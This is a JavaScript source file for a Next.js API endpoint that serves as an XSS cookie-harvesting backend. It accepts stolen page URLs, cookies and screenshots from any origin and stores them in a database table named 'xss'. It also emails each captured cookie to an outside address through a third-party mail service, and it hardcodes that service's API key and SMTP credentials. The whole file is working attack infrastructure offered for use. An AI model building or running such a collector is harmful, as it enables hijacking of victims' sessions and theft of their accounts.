// pages/api/get.js
import { supabase } from '../../utils/supabaseClient';
import moment from 'moment-timezone';

export default async function handler(req, res) {
  // 设置 CORS 头部
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // 处理预检请求（OPTIONS）
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method === 'POST') {
    try {
      const { url = 'null', cookie = 'null', screenshot } = req.body;

      // 获取当前的中国时间
      const chinaTime = moment().tz('Asia/Shanghai').format('YYYY-MM-DD HH:mm:ss');

      // ==== 异步插入 Supabase 数据库（不阻塞主流程）====
      insertToSupabaseAsync(url, cookie, screenshot, chinaTime).catch((dbError) => {
        console.error('数据库插入失败（异步）:', dbError);
      });

      // ==== 异步发送邮件通知（不阻塞主流程）====
      sendEmailNotification(url, cookie).catch((mailError) => {
        console.error('邮件发送失败（异步）:', mailError);
      });

      // 立即返回成功响应，不等待数据库和邮件操作完成
      res.status(200).json({
        message: '请求已接收，数据正在异步处理',
      });
    } catch (error) {
      console.error('处理 POST 请求时出错:', error);
      res.status(500).json({ error: '服务器内部错误' });
    }
  } else {
    res.setHeader('Allow', ['POST']);
    res.status(405).end(`Method ${req.method} Not Allowed`);
  }
}

// ===== 异步插入 Supabase 函数 =====
async function insertToSupabaseAsync(url, cookie, screenshot, trigger_time) {

  const { data, error } = await supabase
    .from('xss')
    .insert([{ url, cookie, screenshot, trigger_time }]);

  if (error) {
    throw new Error(`插入数据库失败: ${error.message}`);
  }

  console.log('数据已异步插入 Supabase:', data);
}

// ===== 异步发送邮件函数 =====
async function sendEmailNotification(url, cookie) {
  const mailOptions = {
    ColaKey: "b4S8aGLd0qkzJU1747541550124HWLfTnPixQ",
    tomail: '1445600537@qq.com',
    fromTitle: 'XSS Alert',
    subject: '新 XSS 攻击触发通知',
    smtpCode: "GZVNbreC39GVax3z",
    smtpEmail: "chain00x@163.com",
    smtpCodeType: '163',
    isTextContent: false,
    content: `
      <h2>检测到新的 XSS 触发</h2>
      <p><strong>URL:</strong> ${url}</p>
      <p><strong>Cookie:</strong> ${cookie}</p>
      <p><strong>时间:</strong> ${new Date().toLocaleString()}</p>
    `,
  };

  const response = await fetch('http://luckycola.com.cn/tools/customMail', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(mailOptions),
  });

  const result = await response.json();
  console.log('邮件发送结果:', result);
}